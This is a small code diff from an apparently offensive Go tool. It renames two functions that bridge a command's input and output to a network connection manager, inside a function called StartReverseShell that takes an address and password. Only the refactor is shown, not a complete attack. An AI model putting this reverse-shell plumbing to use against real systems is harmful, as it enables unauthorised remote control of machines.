@@ -47,8 +47,8 @@ func StartReverseShell(address, password string) {
 		return
 	}
 
-	cmdOutErr := comms.BridgerReaderToCM(cmdOut, cm)
-	cmdInErr := comms.BridgeCMToWriter(cm, cmdIn)
+	cmdOutErr := comms.BridgeReaderToConnectionManager(cmdOut, cm)
+	cmdInErr := comms.BridgeConnectionManagerToWriter(cm, cmdIn)
 
 	err = cmd.Start()
 	if err != nil {
